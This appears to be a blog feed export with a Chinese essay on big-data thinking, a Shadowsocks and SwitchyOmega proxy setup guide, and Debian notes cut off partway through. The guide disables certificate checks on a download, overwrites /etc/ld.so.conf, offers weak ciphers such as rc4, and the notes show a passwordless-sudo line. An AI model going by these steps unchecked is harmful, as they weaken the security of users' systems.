逆向思维股神巴菲特有这样的一句名言：别人贪婪时我恐惧，别人恐惧时我贪婪。换句话理解，就是人们需要有一种逆向思维，这也是对创新的另一种理解。IBM公司曾经是世界上最大的计算机公司，也曾是世界上经济效益最好的计算机公司。1985年，IBM公司的通用大型机毛利率高达85%，中小型机毛利率高达50%，占世界通用大中型计算机市场的70%。到了20世纪80年代后期开始，计算机开始向小型化的个人电脑发展。到了1993年，IBM公司连续亏损，亏损的金额高达168亿美元。为了集中精力进行硬件开发，IBM公司就把个人电脑的操作系统授权给了微软公司。随着IBM个人电脑兼容机的大规模普及，微软和英特尔占据了个人电脑产业系统的核心位置，而IBM硬件则逐渐被边缘化了。苹果公司运用逆向思维，另辟蹊径，用一种全新的方式建立了新的产业形态，撼动了微软和英特尔的领导地位。逆向思维运用得好，就会将缺点变成优点，把不可能变成可能。纵观这些企业之间的竞争和案例，无不告诉我们这样一个道理：“当你面对强手的时候，千万不要被对方牵着鼻子走，而是寻找到自己的节奏，迈出适合自己的步伐，脚踏实地，并懂得“想他人所想不到，做他人所做不到”。5 大数据能量的积累与爆发5.1 关联思维从数据中寻找出一定的相关关系，通过这种关系，大数据会做出预测，从而告诉大众结果。这就是大数据方法论的核心思想。麻省理工学院气象学家洛伦兹曾向人们介绍过一种现象—“蝴蝶效应”。一只南美洲亚马孙河流域热带雨林中的蝴蝶，偶尔扇动几下翅膀，两周后，美国得克萨斯州掀起了一场龙卷风。从表面上看来，似乎这之间毫无关系，但结果告诉我们，即使是微小的事情也极有可能与千里之外的一件事情发生关联，并带来改变。5.2 双刃思维“大数据时代”的隐患：只要你在网络上活动，无论你在做些什么，都会被“记录在案”，甚至不知在什么地方，又以哪种形式被人揪出来。更可悲的是，你想不想出来的主动权不是由自己说了算，而是由网络运营商来决定。“大数据”是一把双刃剑，人们在享受大数据带来的机遇时，也不得不面临一个残酷的问题，以及可能爆发的大数据危机。5.3 价值思维“大数据”真的那么具有吸引力吗？网络用户每点击一次鼠标，每一次刷卡消费，都已经参与了数据的生成。可以说，每一个用户都是数字的生产者和消费者。凭借如此精细的监测手段，完全可以知道一个人或一辆车的行踪，从而产生精细化的数据，用以描述各种物体、社会和整个环境的行为。有了这些数据，大大减少了社会的复杂度。在商业领域，一家美国的公司已经利用大数据，在亚马逊的云平台上处理跟天气相关的信息，从而帮助农业种植者保障自己的收益。对企业数据信息的深度挖掘和分析，能够对经济运行的状况进行准确的预警，从而做出正确的应对决策。在金融领域方面，大数据分析师都已经成为在美国华尔街基金股票分析和高频数据交易等领域最抢手的人才；在中国，阿里巴巴集团旗下的金融业务，也开始用大数据来发放“信用贷款”。大数据时代带来了比以往机会更大的发展空间。这包括以下几个方面：第一个方面，是技术创新的新空间。第二个方面是商业模式的创新。第三个方面是信息资产的经营。第四个方面是客户关系管理。第五个方面是个性化精准推荐。6 大数据引导的商业变革6.1 知识思维“核心竞争力”这一理念，是由美国学者普拉哈德和哈默提出的。他们把其定义为：组织中的积累性学识，特别是关于如何协调不同的生产技能和有机结合多种技术流派的学识。大数据的核心是思想，不是技术。端到端是一个面向大数据的解决方案。英特尔的理念是在这个解决方案里实现数据价值的挖掘。所谓“端到端”，前端视频采集、分析、存储，及后端数据中心处理等。总而言之，知识经济才是提高核心竞争力的有效途径。首先，知识经济时代可以识别企业核心知识，并提高企业的创新能力。其次，信息化建设可以使知识管理更有效地进行，提高企业的核心竞争力。6.2 变革思维大数据的价值不言而喻，但也有着两面性。大数据催生了一批新型科技公司，吸纳科技人才就业，并为企业发展转型提供了新机遇；另外一方面，大数据给个人、企业乃至国家带来了一些危机，如隐私、重构信息安全、竞争力差距拉大以及数据产权争端等问题。大数据改变了人们的生活，塑造出了不同的个性化思维。比如，人们白天在电脑前浏览网页或下个订单，第二天就能收到自己想要的东西；晚上出门消费，不再是给现金，而是刷卡；看电影也不再苦苦排队，而是提前团购或预订……由此，人们的行为举止都会被记录下来，从而产生数据再比如，气候公司会根据各个城市的气温高低、降雨量、土壤的状况和往年的农作物产量等情况，预测出第二年农场的产量，甚至还向农户出售个性化保险；阿里巴巴集团根据在淘宝网上中小企业的交易状况，筛选出财务健康和讲究诚信的企业，为其发放无须担保的贷款。再举个例子：我们得到了一个人的短信和通话数据、他微博的内容数据、医保和社保的数据，还有城市交通数据、签到数据、社交关系数据等。通过这些数据，我们就能对这个人形成深刻的认识，从而为其打造出完全个性化的服务。百度大数据关于技术方面的事例百度大数据开放平台百度工业革命6.3 生产思维人类的行为是否可以被预测？如何运用“私人定制”思维？大数据“定制化”需得具备几个条件：首先，要有海量的数据；其次，这些数据能够挖掘出对生产商家有价值的信息；再次，具备挖掘这样的数据的技术能力；最后，要有能力整合生产、流通和销售这些关键环节。6.4 自动化思维关于信息安全，大数据作出的最大贡献就是通过自动化分析处理与深度挖掘，将亡羊补牢式的处理，转向还没有发生前的自动化评估预测和应急措施。大数据解析航空安防和自动化首先，从目前来说，飞机是地球上最安全的旅行交通工具，比其他交通工具，如汽车、火车等安全级别高很多。其次，飞机发生事故所造成的社会影响比其他交通工具发生事故造成的社会影响更大。再次，国外的一些专家经过研究得出了一个结论，那就是：国际航班比国内航班出事故的概率要低一些。其实并非如此，所有国家的航班出现事故的概率都相差无几，并不是发达国家的国际航班就更安全一些。最后，飞行过程中的安全概率是根据起飞和爬升到巡航高度，以及下降和着陆来决定的。当然了，这也是飞行中最容易出问题的地方。6.5 导向思维新生的婴儿在第一时间就得学会哭泣；上学时，坐进教室的第一时间就得知道上什么课，拿什么书；进入高中后，必须规划今后的人生，上什么学、学什么专业、找什么样的姑娘或嫁什么样的男人，从事什么工作……这些，都需要一个导向思维，如果仅仅靠得过且过，明天的事明天说，犹如行尸走肉一般，一生将无建树。当然，绝大多数的人们，不会甘于现状，苛求发展，即使没有真正发展，也在内心存在这样的渴望，并独自努力。有了导向思维后，一切才会有规律地发展和进步，无论成功与否，其占据的位置都是其他特长所无法替代的。就好比当下就很火爆的阿里巴巴集团旗下的淘宝、天猫等，如果不是因马云的导向思维，怎么会有今天的互联网地位？马云的故事“作为一个创业者，首先要给自己一个梦想。1995年我偶然有一次机会到了美国，然后我看见了、发现了互联网。我对技术几乎不懂，到目前为止，我对电脑的认识还是部分停留在收发邮件和浏览页面上。但是这并不重要，重要的是你到底有什么梦想。”在创业前，马云已经不缺钱了，至少是不缺吃饭的钱。在那个年代，马云是一名外语教师，还开了一间翻译社，又做夜校老师，有多个渠道的收入来源。用今天的话来说，马云已经脱离了蚁族和蜗居的时代，完全是不愁吃喝的公务员的待遇。但是，有了如此安逸闲适的生活之后，马云为何还要出来创业呢？因为，他想要的并不是这些，而是梦想，一个伟大的梦想。每个人都会说，我想要环球世界，我想要改变世界，我要让每一个人知道我的存在，为我的成功喝彩。可今天一过，继续过着朝九晚五的生活，在论坛或好友群吐槽工作的不易、上司不懂慧眼识英雄，闲时睡大觉、打游戏、三五好友瞎侃……如果你永远这样，那么你的导向思维没有起到任何作用，而仅仅是一个想法。IBM大数据战略导向认知计算2014年3月，在IBM公司大数据新闻发布会上，IBM大中华区大数据和分析及新市场总经理，全球企业咨询服务部合伙人Jason Kelley宣布：“2014年，IBM大数据战略将持续升级在大数据方向的投入。IBM将继续深入在金融、电信、医疗、零售、制造等各行业的实践；并增强大数据与分析与云计算、移动、社交等热点趋势的融合，以及实现认知分析与大数据应用的不断融合。”IBM大中华区大数据中心总监王晓梅说：“在未来的大数据与分析实践中，IBM将进一步帮助企业把分析注入关键业务流程，从‘六大要务’角度解析业务需求，并导出对应的大数据与分析战略蓝图。当前，我们将重点推行该六大要务中对于客户洞察和流程革新的指导，帮助企业通过使用社交媒体分析等进行客户关系管理、市场营销决策，通过利用预测性维护、实时预警等进行财务等运营流程的优化。”从2005至今，IBM公司并购了35家以上的公司，比如，高速文件传输工具Aspera、IBM收购数据分析软件公司The Now Factory和备受关注的DaaS供应商Cloudant。综上所述，没有导向思维，就没有前进的动力和方向。没有大数据导向思维，就没有成功的可能性。7 大数据的营销策略7.1 测量思维在进行大数据测试之前，首先要对测试需求做清晰的分析。举个例子：假设一个本科院校的学籍管理系统主要是用来管理学生的，学生在系统中的生命周期一般是四年。根据学校现有的在校生数和五年内的每一年的招生数据，就可以分析出需要构造的各个学年下的学生数。接着，对测试需求做准确清晰的分析后，对输入的测试数据进行分析。要求主要表现在两方面：一方面要求测试数据与生产环境数据一致。另一方面，就要求测试数据输入要满足输入限制规则，尽量覆盖到满足规则的不同类型的数据。问题探讨：到底是什么影响人们的幸福感呢？随着物质生活水平的提高，生活质量越来越得到人们的重视，而且，社会的总体心态与人们的行为准则有着密不可分的联系。一些社会指标告诉人们：最容易产生负面情绪的人群，不一定是生活最困难的人群，而是期望值与自身生活水平差距较大的人群。举个例子：关于幸福感的研究，学术界的大多人士都表明，幸福感是一种感觉，并不与财富的多少以及生活水平的高低成正比。社会心理学家曾列过这样的一个公式：期望实现值除以内心的期望值才等于人的情绪指数。期望实现值与内心期望值的比值一旦大于或等于1时，人就会处于一种兴奋的状态，就会感到满足；相反，如果期望实现值与内心期望值的比值小于1时，人就会感到压抑，“唉”声连连，甚至做出一些平时不做的极端事。7.2 谈判思维所谓谈判，说的就是彼此之间，为了实现某种目的而进行的一种意见交换，然后寻找到一个制衡点，寻求问题解决的途径并达成协议的过程。在商业谈判中，我们绝对不能忽略数据对谈判结果产生的影响。打个比方说，数据就好比是一棵大树的枝叶，而想要与另一棵大树做比较的时候，除了其主干因素外，这些枝叶就是最为明显的可比部分。也就是说，掌控足够多的数据，将在谈判过程中掌控先机。如何利用数据在谈判中获得优势呢？掌控绝对的数据还要有针对性不利用数据，仅仅依靠过去经验和谈判员的弊端对产品认识不足的情况很容易出现在谈判桌上，从而导致在谈判中失去主导地位。而且，由于这种产品知识比较抽象，将之比喻为对产品以及产品所在行业的市场直觉更为合适。而直觉又往往是很难通过言语表达出来的，这就使得我们很难组织出一套权威的术语来说服对方，所以，就很难赢得对方的认可。更为重要的一点是，要想形成产品知识，还和销售人员有着至关重要的关系。7.3 预算思维在这个时代，财务所面对的数据规模将会越来越大，数据类型也将越来越复杂。那么，如何整理与统计这些杂乱无章的数据，让这些数据能够更直观明了地展现在人们面前，并且为企业管理者的经营决策提供有效的科学依据，则成为现阶段我们必然考虑的问题之一。对此问题，业内人士表示，全面预算管理将是让企业大数据“活起来”的最好方式。首先，预算是根据历年的数据和某些调整信息，对未来时期进行分析评测，进而得出的信息。其次，它是由实际业务数据和预算数据相结合与比较之后，而设计出来的一套最佳管理方案。利用这套方案，可以让企业资源得到更充分的利用，从而在未来获得更大的利益回报。笼统地说，全面预算管理解决方案是在对企业内外部大数据进行收集、处理、控制、分析、整合等的基础上，与其他工具结合，帮助企业更好地利用数据实现战略落地。7.4 选定思维你了解你的客户吗？你能分清你的客户群体中哪些是可以长久合作、哪些只是暂时短期的利益相互关系吗？你的营销和广告投入应该针对哪类客户群体，你都清楚吗？企业想要做到正确的定位客户，首先就必须先设定目标。找到有价值的客户并不代表着就一定能够进行合作。“建立品牌”8 教育、教学正在大数据化8.1 院校思维“大数据”时代，如何推动和创新院校教育模式区别：传统数据的整理方式能凸显学生整体的专业水平或整体素质、身体的发育状况、社会性情绪及适应性的发展，还有对学校的满意程度等。而大数据就不一样了，它具备的分析能力更广、更细腻。它可以去关注每一个学生的微观表现，比如，在考试时，他在一道题上逗留了多久；在不同学科课堂上，他开小差的次数是多少；在食堂吃饭，他喜欢吃什么，不喜欢吃什么；每个学生的出生日期，包括喜欢的颜色等。这些数据对其他个体没有意义，但所有学生的数据整合起来对大数据分析就有价值了。比如旷课、纪律或课堂表现等预测模式，教育者就可以确认哪些学生退学的可能性较高。通过利用大数据来观察并分析对学生在课堂中点滴的表现，大数据帮助我们可以了解学生对知识的掌握程度以及感兴趣程度，进而让学校反思自己的教学模式是不是满足了学生的需求。有了大数据以后，教育工作者们就可以针对不同的学生进行不同的教育模式，从而真正做到因材施教和以人为本。传统的院校决策模式总结为四种：第一种是通过“合意”的过程来平衡大学内多方群体利益的“学院型”模式；第二种是通过“扩散”程序表达不同权力集团、利益群体诉求的“政治型”模式；第三种是决策程序无章可循、随意性大的“有组织无政府型”模式；第四种是依靠决策者所具有的理性认知能力制定决策的“官僚主义”模式。这四种模式的共同弱点在于缺少有力的决策支持依据，管理者实际上是以“有限理性”为基础，努力做出“足够好”的决策。在大数据背景下的院校决策，可以为教育决策者提供和完善认知经验所缺乏的信息、知识和智慧。针对这样的情况，有学者将其称为以数据系统为支撑的“知会理性”决策模式。8.2 教学思维大数据变革教育的第一波浪潮翻转课堂是未来教育的课堂模式。采取让学生在上课前先学习教学视频，在课堂上完成作业或做实验的方式，而老师则在学生遇到学习困难时给予帮助，对他们进行一对一的个性化指导。MOOC风暴来袭，放大翻转课堂效应。微课程兴起：回应翻转课堂和MOOC浪潮。8.3 教育思维“大数据时代”以不可挡的势头扑面而来，给教育界的人敲响了警钟，告诉他们：“原始”的教育方式已经成为过去，“新时代”已经袭来。“大数据”并不是一种技术的时尚潮流，而是在信息技术高度发展之后，人们如何开发利用数据为新的商业模式发展奠定基础的过程。与此同时，也是一种基于新工具解决问题的全新思路。“大数据”怎么样改变传统的教育？第一个方面是改变教育研究中对数据价值的认识；第二个方面是方便校长、教师更全面了解每一个学生；第三个方面是帮助学生进行个性化高效学习。]]></content>
      <categories>
        
          <category> 软件工程 </category>
        
      </categories>
      <tags>
        
          <tag> Big-Data </tag>
        
          <tag> 大数据 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Over the wall with Shadowsocks+SwitchyOmega]]></title>
      <url>/network/software/2018/08/10/shadowsocks-switchyOmega/</url>
      <content type="text"><![CDATA[This article is for communication only, please do not use for business! The author of this article is not responsible for any consequences. thanks for your attention!本文内容仅作交流学习之用，请勿用于商业！如造成任何后果，本文作者概不负责。谢谢您的关注！If you have questions, please send email to zrg1390556487@gmail.com.1 Server1.1 Buy a Cloud Host搬瓦工DigitalOcean1.2 Installing and Configuring ShadowsocksInstalling pip# yum install python-pipor# curl "https://bootstrap.pypa.io/get-pip.py" -o "get-pip.py"# python get-pip.py# pip install --upgrade pipInstalling shadowsocks#pip install shadowsocks#vim /etc/shadowsocks.json{  "server": "server_ip",//server ip address  "server_port": 8388,//server port  "local_address":"127.0.0.1",//local address  "local_port":1080,//local port  "port_password":{ //multiple port          "9001":"password9001",          "9002":"password9002",          "9003":"password9003",     },  "password": "password",//password  "method": "aes-256-cfb",//encryption  "timeout":600 //timeout  }explanation: server:server ip addressserver_port:server portpassword:use password toolmethod:aes-128-cfb, aes-192-cfb, aes-256-cfb, bf-cfb, cast5-cfb, des-cfb, rc4-md5, chacha20, salsa20, rc4, tableConfiguring auto-start#vim /etc/systemd/system/shadowsocks.service[Unit]Description=Shadowsocks[Service]TimeoutStartSec=0ExecStart=/usr/bin/ssserver -c /etc/shadowsocks.json[Install]WantedBy=multi-user.targetStart shadowsocks#systemctl enable shadowsocks#systemctl start shadowsocks#systemctl status shadowsocks -lAuto install script$vim install-shadowsocks.sh, content of file from install-shadowsocks.sh#chmod +x install-shadowsocks.sh#./install-shadowsocks.sh2 Client2.1 Linux2.1.1 Install and Use Shadowsocks Command Line Client on LinuxLinux seriesDebian/Ubuntu:$sudo apt-get install python-pip$sudo pip install shadowsocksFedora/Centos:$sudo yum install python-setuptools   or   sudo dnf install python-setuptools$sudo easy_install pip$sudo pip install shadowsocksOpenSUSE:$sudo zypper install python-pip$sudo pip install shadowsocksArchlinux:$sudo pacman -S python-pipsudo pip install shadowsockssslocal is the client software and ssserver is the server software. On some Linux distros such as ubuntu, the shadowsocks client sslocal is installed under /usr/local/bin. On Others such as Arch sslocal is installed under /usr/bin/. Your can use whereis commandto find the exact location.user@debian:~$ whereis sslocalsslocal: /usr/local/bin/sslocal/etc/shadowsocks.json{"server":"server-ip","server_port":8000,"local_address": "127.0.0.1","local_port":1080,"password":"your-password","timeout":600,"method":"aes-256-cfb"}$sudo sslocal -c /etc/shadowsocks.jsonTo run in the background$sudo sslocal -c /etc/shadowsocks.json -d startAuto Start the Client on System Boot/etc/rc.local$ sudo vim /etc/rc.localsudo sslocal -c /etc/shadowsocks.json -d startCheck if It Works#sudo systemctl status rc-local.service2.1.2 Global ProxyInstall and Configure polipo$ sudo apt install polipo$ sudo vim /etc/polipo/configlogSyslog = truelogFile = /var/log/polipo/polipo.logproxyAddress = "0.0.0.0"socksParentProxy = "127.0.0.1:1080"socksProxyType = socks5chunkHighMark = 50331648objectHighMark = 16384serverMaxSlots = 64serverSlots = 16serverSlots1 = 32Restart polipo$ sudo systemctl restart polipoExport http_proxy and https_proxy$ export http_proxy="http://127.0.0.1:8123/"$ export https_proxy="https://127.0.0.1:8123/"testing$ curl www.google.com2.1.3 Solving ProblemShadowSocks start error: undefined symbol EVP_CIPHER_CTX_cleanup[Reason]openssl 1.1.0 "EVP_CIPHER_CTX_cleanup" is old.[Solving]$ vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.pyVIM Command&#65306;:%s/cleanup/reset/:xnot support "chacha20"[Solving]$ apt install m2crypto gcc -y$ wget -N --no-check-certificate https://download.libsodium.org/libsodium/releases/libsodium-1.0.8.tar.gz$ tar zxvf libsodium-1.0.8.tar.gz$ cd libsodium-1.0.8$ sudo ./configure$ sudo make &amp;&amp; make install$ sudo echo "include ld.so.conf.d/*.conf" &gt; /etc/ld.so.conf$ sudo echo "/lib" &gt;&gt; /etc/ld.so.conf$ sudo echo "/usr/lib64" &gt;&gt; /etc/ld.so.conf$ sudo echo "/usr/local/lib" &gt;&gt; /etc/ld.so.conf$ sudo ldconfig2.2 Windows2.2.1 DownloadDowload1Dowload2 密码：jnfr2.2.2 Configureunziprunningproxy2.3 Android2.3.1 Downloaddownload location 密码：5n8v2.3.2 Configure2.4 IOSOpen "App Store", To search "shadowrocket". Current price: ￥12Add server configure. Okay.2.5 Mac OS XDownload Location3 Browser Plugin: SwitchyOmega3.1 DownloadDowload Location3.2 Configuresetting proxyauto switchAdd rule.rule list settingrule:http://autoproxy-gfwlist.googlecode.com/svn/trunk/gfwlist.txtorhttps://raw.githubusercontent.com/gfwlist/gfwlist/master/gfwlist.txt4 Referenceshttps://zh.wikipedia.org/zh-hans/Shadowsockshttps://shadowsocks.comhttp://shadowsocks.org/在 CentOS 7 下安装配置 shadowsocksInstall And Use Shadowsocks Command Line Client on LinuxShadowsocksR 客户端 小白使用教程ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanupSwitchyOmegaIOS系统推荐几款支持Shadowsocks的代理软件各种系统下Shadowsocks客户端的安装与配置linux 配置shadowsocks代理全局代理linux ubuntu下使用ss设置全局代理,命令行也走代理]]></content>
      <categories>
        
          <category> network </category>
        
          <category> software </category>
        
      </categories>
      <tags>
        
          <tag> VPN </tag>
        
          <tag> Shadowsocks </tag>
        
          <tag> SwitchyOmega </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Debian GNU/Linux]]></title>
      <url>/linux/2018/08/06/using-debian/</url>
      <content type="text"><![CDATA[本文题目应该是“Linux 操作系统”，只因平时都是使用 Debian，所以 Title 就是“Debian GNU/Linu”）。以下就是我从开始接触 Linux 到现在的一些使用笔记。1 前言(Preface)欢迎阅读本册子，和其他大全图书不一样，本册子以实践的方式介绍 Linux 基础、Linux 服务架构和 Linux 实用技巧，涵盖了详尽的动手教程和实践信息，还提供了与内容相关的参考资料。本册子可以作为 Linux 的操作参考工具书。作者会持续更新与完善内容，血不流干，死不休战。1.1 读者对象Linux 系统管理员如果你是 Linux 环境下的系统管理员，那么本册子也许能为你提供一定的帮助。Linux 爱好者如果你是 Linux 爱好者，本册子将告诉你部分问题的解决办法及原因。1.2 内容结构本册子分为五大部分。第一部分，获取和安装 Linux 系统，Linux 系统的初步设置，Linux 介绍。第二部分，介绍 Linux 文件、目录及磁盘的常见操作。第三部分，学习及应用 shell 脚本(script)。第四部分，Linux 进阶篇，对于 Linux 系统管理员比较实用，主要介绍 Linux 帐号管理及 ACL 权限控制，Linux 定时任务，Linux 网络，一些常见服务软件的架设。第五部分，问题解决篇，聚集常见开发、运维中遇到的各种问题的解决办法，该部分可理解为本书的附录或问题解决参考手册。编写规范章节编码级别限制为 3 级。列表中标题与描述内容分开。保持各部分有序顺序，不能随意变更。阅读提示阅读本文时，每个知识章节都会有「参考资料」或「References」的章节，部分实际操作章节除外。所有内容以笔记的形式编写，非权威指南类型，仅供参考。本文将会省去一些有关 Linux 的常识性介绍，比如 Unix/Linux 发展史等，更多的是以过往的经验来介绍学习 Linux 的方法或建议，试图对一些 Linux 常见、实用的实践操作进行更详尽的说明，便于后来者学习。1.3 作者zrg 的 Linux 学习之路（My road of learning Linux）第一次接触 Linux 是由于大二上学期的 Linux 基础课，但是，我并没有喜欢上这个系统，因为关于 Linux 的一切，对我来说都是陌生的，我在想我既然已经对 Windows 操作系统，又何必去瞎折腾呢，况且 Windows 可以完成 Linux 上的所有事情（后来，我发现我错了）；另一方面，可能是由于授课老师的坚毅个性，让我不想再去学习它，尽管当时我自己是多么幼稚，多么可笑。后来，当我在听说 Linux 用来当服务器使用很好的时候，我开始尝试使用它来完成一些工作的时候，开始我有点喜欢 Linux 操作系统，不断的尝试（学习）使用 Linux，发现使用 Linux 来完成编程开发越来越完美了。再后来，就是现在了，能使用它搭建一些服务，使我的生活更加方便，并将一些网站之类的放在上面，下面就是平时使用 Linux 的总结，仅供参考！尽管工作的大部分时间都在用 Windows 操作系统，但是对 Linux 系列的折腾从未停止过。现在好了，今年（2018年）1月换了一份工作，公司使用的技术基本都是 Linux 上构建的，除了正常必要性开发，使用 Windows，使用 Linux 的时间将占据工作时间的 1/3。今年5月（2019年），来深圳入职了，团队比较开放，现在我的大部分开发工作都在 Linux 下完成。#2019-06-07，持续更新中……jsf 的 Linux 学习之路（My road of learning Linux）那些年用过的 Linux 操作系统Ubuntu 12.04/14.04/16.04/18.04;CentOS 6.x/7.x;RedHat 7;Debian 7/8/9;SUSE Linux Enterprise server 11/12;Raspberry pi Debian;1.4 英文太差，能学好 Linux 吗？关于这个问题，可以参考一下两个链接，或许能让你收获点什么！Linux很有趣，可我的英文太差了，怎么办？解谜英语语法2 开始(Get Started)2.1 安装(Installation)2.1.1 安装过程安装准备首先，准备一个U盘，用来刻录系统（刻录命令：dd，用法格式：sudo dd if=xxx.iso of=/dev/sdb），到 https://www.debian.org/ 下载 iso 镜像，注意有最小版和完整版。Windows 下的刻录软件推荐使用 UltraISO（对于新手，建议在 Windows 下完成刻录）。插入U盘，开机，开始选择安装。2.1.2 主机规划与磁盘分区2.1.3 安装后的常用操作查看 Linux 发行版名称及版本号查看 Linux 内核版本// 方式一$ cat /proc/version// 方式二$ uname -a查看 Linux 系统版本// 方式一$ lsb_release -a //这个命令适用于所有的Linux发行版，包括Redhat、SuSE、Debian…等发行版。// 方式二$ cat /etc/redhat-release //这种方法只适合Redhat系的Linux// 方式三$ cat /etc/issue //使用所有Linux版本Linux 上挂载NTFS格式文件系统方案A（Scheme A）：使用linux-ntfs获取安装$ wget http://prdownloads.sourceforge.net/linux-ntfs/kernel-module-ntfs-2.6.18-92.el5-2.1.27-0.rr.10.11.x86_64.rpm$ sudo rpm -ivh kernel-module-ntfs-2.6.18-92.el5-2.1.27-0.rr.10.11.x86_64.rpm检查 ntfs 模块是否被加载进系统$ /sbin/modprobe ntfs[没有输出则代表存在；否则（otherwise）将会有错误信息（error message）报出（report）]$ cat /proc/filesystems[ntfs应该出现在列表中]查看NTFS系统的编号/sbin/fdisk -l |grep NTFS 创建目录$ sudo mkdir -p /mnt/win_ntfs$ sudo mount -t ntfs /dev/sda1 /mnt/win_ntfs方案B（Scheme B）：使用fuse和ntfs-3g获取$ wget http://downloads.sourceforge.net/project/fuse/fuse-2.X/2.7.4/fuse-2.7.4.tar.gz?use_mirror=ncu$ wget http://www.ntfs-3g.org/ntfs-3g-2009.4.4.tgz编译安装$ tar -zxf fuse-2.7.4.tar.gz$ ./configure --prefix=/usr/local/fuse-2.7.4$ sudo make $ sudo make install$ tar -zxf ntfs-3g-2009.4.4.tgz$ ./configure --prefix=/usr/local/ntfs-3$ sudo make $ sudo make install 检查fuse模块是否被加载进系统$ /sbin/modprobe fuse[没有输出则代表存在；否则将会有错误信息报出]$ cat /proc/filesystems[fuse应该出现在列表中]查看NTFS系统的编号 $ sudo fdisk -l |grep NTFS 挂载$ mount ntfs-3g /dev/sda1 /mnt/win_ntfs自动挂载 NTFS 格式硬盘安装 ntfs-3g$ sudo apt-get install ntfs-3g步骤1：编辑/etc/fstab$ sudo vim /etc/fstab/dev/sdb1 /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0    #Notice:# If /dev/sdb1 path will change due to system configuration, I recommend that you use the UUID (Universally Unique Identifier) of the partition. To find the UUID of /dev/sdb1, enter:#&#32763;&#35793;&#65306;/dev/sdb1 &#36335;&#24452;&#20250;&#38543;&#30528;&#31995;&#32479;&#37197;&#32622;&#32780;&#25913;&#21464;&#65292;&#24314;&#35758;&#20351;&#29992; UUID &#65288;&#36890;&#29992;&#21807;&#19968;&#26631;&#35782;&#31526;&#65289;# Note down the UUID value and update /etc/fstab as follows:# &#32763;&#35793;&#65306;&#35760;&#24405;&#19979; UUID&#65292;&#26356;&#26032; /etc/fstab &#25991;&#20214;&#12290;# syntax# UUID="YOUR-UID-HERE" /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0UUID="c2dbc0c5-a8fc-439e-aa93-51b0a61372e8" /mnt/ntfs/ ntfs nls-utf8,umask-0222,uid-1000,gid-1000,ro 0 0# Owning entire file systemUUID="c2dbc0c5-a8fc-439e-aa93-51b0a61372e8" /mnt/ntfs/ ntfs uid-1000,gid-1000 0 0下面是查看 UUID 的命令。$ sudo /sbin/blkid /dev/sda1保存关闭文件步骤2：创建目录$ sudo mkdir -p /mnt/ntfs步骤3：测试（Test）可用性$ sudo mount -a$ df -h$ cd /mnt/ntfs$ ls -l步骤4：卸载NTFS分区$ sudo umount /mnt/ntfs// or$ sudo umount /dev/sda1注意错误信息：“Read-only file system”提示$ sudo  mv 05Music/ /mnt/sda/sda2//bin/mv: inter-device move failed: '05Music/' to '/mnt/sda/sda2/05Music'; unable to remove target: Read-only file system解决（Solving）：配置 /etc/fstab参考资料https://www.cyberciti.biz/faq/debian-ubuntu-linux-auto-mounting-windows-ntfs-file-system/http://www.tuicool.com/articles/ZbENfiehttps://wiki.archlinux.org/index.php/NTFS-3Ghttps://wiki.archlinux.org/index.php/Fstab_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)https://wiki.archlinux.org/index.php/NTFS-3G_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)boot 加载选项修改$ sudo chmod +w /boot/grub/grub.cfg$ sudo vim /boot/grub/grub.cfg注释不需要的加载项！改变 Home 目录下的目录中文名称为英文方法1$ vim ~/.config/user-dirs.dirsXDG_DESKTOP_DIR="$HOME/Desktop"XDG_DOWNLOAD_DIR="$HOME/Download"XDG_TEMPLATES_DIR="$HOME/Template"XDG_PUBLICSHARE_DIR="$HOME/Public"XDG_DOCUMENTS_DIR="$HOME/Document"XDG_MUSIC_DIR="$HOME/Music"XDG_PICTURES_DIR="$HOME/Picture"XDG_VIDEOS_DIR="$HOME/Video"方法2$ export LANG=en_USxdg-user-dirs-gtk-update电脑没有声音问题解决安装驱动软件$ sudo apt-get install alsa-utils$ sudo apt-get install alsa-oos$ sudo apt-get install esound$ sudo apt-get install gnome-audio检查声卡驱动$ lspci |grep Audio检查内核模块$ lsmod |grep snd检查系统音量$ alsamixeralsamixer 是 alsa 驱动的一个插件,是一个命令行下的图形设置工具。alsamixer 命令，00 表示音量正常，MM表示此声道静音。可以通过M键切换。初始化声卡$ sudo alsactl init参考资料解決 Ubuntu Linux 16.04 耳機輸出沒有聲音的問題关机和重启命令shutdown关机、重启计算机(Halt, power-off or reboot the machine)$ sudo shutdown -r now// 其他重启命令$ sudo reboot$ sudo init 6Table 1: 系统运行级别级别描述0关机，不允许设置为初始化默认值1单用户模式2不完全多用户，不含NFS服务3完全多用户4未分配5图形界面6重启，不允许设置为初始化默认值$ cat /etc/initable// 查看系统运行级别$ sudo runlevel其他关机/注销命令haltpoweroffinit 0logout2.2 配置(Configuration)2.2.1 用户身份切换: su &amp; sudoLinux 系统当中，作身份变换，可能有以下几个原因：使用一般账号：系统平日操作的好习惯用较低权限启动系统服务软件本身的限制su 是最简单的身份切换命令。-：单纯使用 - 如『 su - 』代表使用 login-shell 的变量文件读取方式来登陆系统；若使用者名称没有加上去，则代表切换为 root 的身份。-l：与 - 类似，但后面需要加欲切换的使用者账号！也是 login-shell 的方式。-m：-m 与 -p 是一样的，表示『使用目前的环境配置，而不读取新使用者的配置文件』-c：仅进行一次命令，所以 -c 后面可以加上命令喔！并非所有人都能够运行 sudo，而是仅有规范到 /etc/sudoers 内的用户才能够运行 sudo 这个命令。同时， /etc/sudoers 可以修改默认的 timeout。Defaults        env_resetDefaults        timestamp_timeout=60...root    ALL=(ALL:ALL) ALLzrg     ALL=(ALL:ALL) ALL# &#25351;&#23450;&#29992;&#25143;&#19981;&#29992;&#36755;&#20837;&#23494;&#30721;#zrg     ALL=(ALL:ALL)NOPASSWD: ALL2.2.2 Wifi连接配置（configure）完成安装第一步，当然是先解决网络。查看无线（wireless）网卡（LAN）驱动（driver）$ sudo lsmod | grep iw安装（Installing）无线网卡驱动$ sudo apt-get install firmware-iwlwifi wireless-tools向内核（kernel）中加载/移除模块（modules）$  modprobe iwl4965重启系统$ reboot配置无线网络//查看无线网口（nerwork port）$ sudo 